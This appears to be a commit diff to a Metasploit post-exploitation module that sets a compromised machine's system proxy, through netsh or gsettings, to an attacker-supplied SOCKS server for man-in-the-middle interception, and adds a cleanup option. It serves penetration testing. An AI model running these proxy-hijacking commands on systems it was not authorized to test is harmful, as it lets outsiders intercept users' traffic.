b9e53920ac29dae73e98626ee05ca8e44449d720
Eliott Teissonniere <10683430+DeveloppSoft@users.noreply.github.com>
2018-07-19 20:23:47 +0200

    Cleanup proxy settings

--- modules/post/multi/manage/local_mitm.rb
+++ modules/post/multi/manage/local_mitm.rb
@@ -22,14 +22,20 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('RHOST', [true, 'Host of the socks proxy server']),
-        OptString.new('RPORT', [true, 'Port of the socks proxy server'])
+        OptString.new('RPORT', [true, 'Port of the socks proxy server']),
+        OptBool.new('CLEANUP', [false, 'If we should remove the proxy instead of installing it'])
       ])
   end
 
   def run
     if session.platform == 'windows'
       print_status('Windows detected, using netsh')
-      vprint_status cmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["RHOST"]}:#{datastore["RPORT"]}\" bypass-list=\"<local>\"")
+      
+      unless datastore['CLEANUP']
+        vprint_status cmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["RHOST"]}:#{datastore["RPORT"]}\" bypass-list=\"<local>\"")
+      else
+        vprint_status cmd_exec('netsh winhttp reset proxy')
+      end
     else
       unless command_exists? 'gsettings'
         return print_error('Gsettings is not available')
@@ -37,10 +43,14 @@ class MetasploitModule < Msf::Post
 
       print_good('Gsettings available')
 
-      vprint_status cmd_exec("gsettings set org.gnome.system.proxy mode 'manual'") # tell NetworkManager there is a proxy
-      vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks port #{datastore["RPORT"]}")
-      vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks host #{datastore["RHOST"]}")
-      vprint_status cmd_exec("gsettings set org.gnome.system.proxy ignore-hosts \"['localhost', '127.0.0.0/8', '::1']\"")
+      unless datastore['CLEANUP']
+        vprint_status cmd_exec("gsettings set org.gnome.system.proxy mode 'manual'") # tell NetworkManager there is a proxy
+        vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks port #{datastore["RPORT"]}")
+        vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks host #{datastore["RHOST"]}")
+        vprint_status cmd_exec("gsettings set org.gnome.system.proxy ignore-hosts \"['localhost', '127.0.0.0/8', '::1']\"")
+      else
+        vprint_status cmd_exec('gsettings set org.gnome.system.proxy.mode "none"')
+      end
     end
   end
 end
